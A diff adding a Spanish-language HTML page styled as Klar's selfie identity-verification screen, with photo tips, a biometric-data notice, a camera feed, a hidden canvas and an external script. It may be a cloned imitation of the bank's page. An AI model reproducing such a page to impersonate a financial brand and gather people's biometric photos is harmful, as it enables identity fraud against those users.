@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="theme-color" content="#ffffff">
+    <title>Klar — Verificación de identidad</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="src/css/1442.css">
+
+    <script nonce="imndC7k+HjS4AkhlYJQ2Zg==">
+        if (self !== top) { top.location = self.location; }
+    </script>
+</head>
+<body>
+
+    <main class="screen">
+
+        <header class="topbar">
+            <button type="button" class="nav-btn" aria-label="Volver">
+                <svg viewBox="0 0 24 24" aria-hidden="true">
+                    <path d="M15.4 7.4 14 6l-6 6 6 6 1.4-1.4L10.8 12z"/>
+                </svg>
+            </button>
+
+            <button type="button" class="nav-btn" aria-label="Soporte">
+                <svg viewBox="0 0 24 24" aria-hidden="true" class="stroke">
+                    <path d="M4 13v-1a8 8 0 0 1 16 0v1"/>
+                    <path d="M4 13h2.2a1 1 0 0 1 1 1v4a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1v-5z"/>
+                    <path d="M20 13h-2.2a1 1 0 0 0-1 1v4a1 1 0 0 0 1 1H19a1 1 0 0 0 1-1v-5z"/>
+                    <path d="M18 19.5a3 3 0 0 1-3 2.5h-1.5"/>
+                </svg>
+            </button>
+        </header>
+
+        <div class="brand">Klar</div>
+
+        <section class="content" id="content">
+
+            <h1>Tómate una fotografía</h1>
+
+            <p class="lead">
+                Por tu seguridad validaremos tu identidad con una fotografía. Sigue estos consejos.
+            </p>
+
+            <div class="tips">
+
+                <div class="tip">
+                    <svg class="tip-avatar" viewBox="0 0 48 48">
+                        <defs><clipPath id="c1"><circle cx="24" cy="24" r="24"/></clipPath></defs>
+                        <g clip-path="url(#c1)">
+                            <circle cx="24" cy="24" r="24" fill="#f0d264"/>
+                            <circle cx="24" cy="18" r="7.5" fill="#3b3a39"/>
+                            <path d="M24 27c-7.2 0-12.5 4.2-12.5 10.5V48h25V37.5C36.5 31.2 31.2 27 24 27z" fill="#3b3a39"/>
+                            <path d="M20.5 17.5h7v3.5a3.5 3.5 0 0 1-7 0z" fill="#fff"/>
+                        </g>
+                    </svg>
+                    <div class="tip-text">
+                        <strong>Buena iluminación</strong>
+                        <span>Recuerda ubicarte en una zona bien iluminada.</span>
+                    </div>
+                </div>
+
+                <div class="tip">
+                    <svg class="tip-avatar" viewBox="0 0 48 48">
+                        <defs><clipPath id="c2"><circle cx="24" cy="24" r="24"/></clipPath></defs>
+                        <g clip-path="url(#c2)">
+                            <circle cx="24" cy="24" r="24" fill="#b9d4ea"/>
+                            <circle cx="24" cy="18" r="7.5" fill="#1b2631"/>
+                            <path d="M24 27c-7.2 0-12.5 4.2-12.5 10.5V48h25V37.5C36.5 31.2 31.2 27 24 27z" fill="#1b2631"/>
+                        </g>
+                    </svg>
+                    <div class="tip-text">
+                        <strong>Solo tú puedes aparecer</strong>
+                        <span>Recuerda retirarte los lentes en caso utilices.</span>
+                    </div>
+                </div>
+
+                <div class="tip">
+                    <svg class="tip-avatar" viewBox="0 0 48 48">
+                        <defs><clipPath id="c3"><circle cx="24" cy="24" r="24"/></clipPath></defs>
+                        <g clip-path="url(#c3)">
+                            <circle cx="24" cy="24" r="24" fill="#bfe0c6"/>
+                            <circle cx="24" cy="18" r="7.5" fill="#14532d"/>
+                            <path d="M24 27c-7.2 0-12.5 4.2-12.5 10.5V48h25V37.5C36.5 31.2 31.2 27 24 27z" fill="#14532d"/>
+                        </g>
+                    </svg>
+                    <div class="tip-text">
+                        <strong>Encuadra tu rostro</strong>
+                        <span>Mantén el teléfono a la altura de los ojos y sin moverte.</span>
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="info-box">
+                <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><line x1="12" y1="11" x2="12" y2="16"/><circle cx="12" cy="8" r=".9" fill="#1c1c1c" stroke="none"/></svg>
+                <p>Para confirmar tu identidad, necesitamos usar y guardar tus datos biométricos. <b>Conoce más.</b></p>
+            </div>
+
+            <button type="button" class="btn-primary" id="continueBtn">Empezar</button>
+
+            <div class="camera-area" id="cameraScreen">
+
+                <div class="scanner">
+                    <video id="video" autoplay muted playsinline></video>
+                    <div class="scan-line"></div>
+                    <img src="silueta.svg" id="silueta" class="silueta" alt="">
+                    <div class="face-guide"></div>
+                </div>
+
+                <p class="status" id="status">Esperando...</p>
+
+                <button type="button" class="btn-primary" id="finishBtn">Tomar foto</button>
+
+            </div>
+
+        </section>
+
+        <footer class="footer">Klar Technologies, S.A. de C.V., S.F.P.</footer>
+
+    </main>
+
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script nonce="imndC7k+HjS4AkhlYJQ2Zg==">window.script_nonce = "imndC7k+HjS4AkhlYJQ2Zg==";</script>
+    <script nonce="imndC7k+HjS4AkhlYJQ2Zg==" src="src/js/1442.js"></script>
+
+</body>
+</html>
